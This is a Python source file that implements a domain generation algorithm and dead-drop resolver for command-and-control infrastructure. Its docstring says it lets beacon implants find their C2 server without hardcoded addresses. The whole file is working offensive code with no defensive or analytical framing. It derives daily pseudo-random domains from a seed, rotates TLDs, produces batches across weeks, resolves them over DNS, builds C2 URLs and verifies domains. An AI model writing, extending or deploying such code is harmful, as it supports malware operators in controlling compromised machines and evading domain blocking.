"""Dynamic Domain Generation Algorithm (DGA) and dead-drop resolver.

Generates pseudo-random domain names from seeds so beacon implants can
discover their C2 server without hardcoded addresses. Supports multiple
DGA variants for redundancy.
"""
import datetime
import hashlib
import hmac
import json
import logging
import os
import random
import secrets
import socket
import time
from typing import Optional

logger = logging.getLogger("c2.dga")

TLDS = [".com", ".net", ".org", ".info", ".top", ".xyz", ".club", ".online"]
DGA_SEED = os.getenv("C2_DGA_SEED", "raphael-2.0-default-seed").encode()


class DGAResolver:
    def __init__(self, seed: bytes = DGA_SEED, tlds: list = None):
        self._seed = seed
        self._tlds = tlds or TLDS
        self._generated: dict[str, float] = {}
        self._resolved: dict[str, str] = {}
        self._dead_drop: dict[str, dict] = {}

    def _date_key(self, dt: datetime.datetime = None) -> str:
        dt = dt or datetime.datetime.utcnow()
        return dt.strftime("%Y%m%d")

    def _week_key(self, dt: datetime.datetime = None) -> str:
        dt = dt or datetime.datetime.utcnow()
        return dt.strftime("%Y%W")

    def generate_domain(self, variant: int = 0, dt: datetime.datetime = None) -> str:
        dt = dt or datetime.datetime.utcnow()
        date_part = self._date_key(dt)
        raw = hashlib.sha256(self._seed + date_part.encode() + str(variant).encode()).hexdigest()
        length = 8 + (int(raw[-2:], 16) % 12)
        domain_part = raw[:length]
        tld_idx = int(raw[-4:-2], 16) % len(self._tlds)
        domain = f"{domain_part}{self._tlds[tld_idx]}"
        self._generated[domain] = time.time()
        return domain

    def generate_domains(self, count: int = 10, dt: datetime.datetime = None) -> list[str]:
        domains = []
        seen = set()
        attempts = 0
        while len(domains) < count and attempts < count * 5:
            variant = len(domains) + attempts
            domain = self.generate_domain(variant, dt)
            if domain not in seen:
                seen.add(domain)
                domains.append(domain)
            attempts += 1
        return domains

    def generate_legion_domains(self) -> list[dict]:
        """Generate multiple domain batches for different time windows."""
        now = datetime.datetime.utcnow()
        results = []
        for offset in range(-1, 4):
            dt = now + datetime.timedelta(days=offset * 7)
            domains = self.generate_domains(5, dt)
            results.append({"window": self._week_key(dt), "date": dt.isoformat(), "domains": domains})
        return results

    def resolve_domain(self, domain: str, check_dns: bool = False) -> Optional[str]:
        if domain in self._resolved:
            return self._resolved[domain]
        if check_dns:
            try:
                result = socket.getaddrinfo(domain, 443, socket.AF_INET)
                if result:
                    ip = result[0][4][0]
                    self._resolved[domain] = ip
                    return ip
            except (socket.gaierror, OSError):
                pass
        return None

    def set_dead_drop(self, domain: str, data: dict):
        self._dead_drop[domain] = {
            "data": data,
            "set_at": time.time(),
        }

    def get_dead_drop(self, domain: str) -> Optional[dict]:
        entry = self._dead_drop.get(domain)
        if entry and time.time() - entry["set_at"] < 86400:
            return entry["data"]
        return None

    def generate_c2_urls(self, base_port: int = 443, count: int = 5) -> list[str]:
        domains = self.generate_domains(count)
        return [f"https://{d}:{base_port}" if base_port != 443 else f"https://{d}" for d in domains]

    def verify_domain(self, domain: str, hmac_key: bytes = b"") -> bool:
        for dt_offset in range(-3, 4):
            dt = datetime.datetime.utcnow() + datetime.timedelta(days=dt_offset)
            for variant in range(20):
                expected = self.generate_domain(variant, dt)
                if domain == expected:
                    return True
        return False

    def stats(self) -> dict:
        return {
            "generated_domains": len(self._generated),
            "resolved": len(self._resolved),
            "dead_drops": len(self._dead_drop),
            "active_domains": self.generate_domains(10),
        }
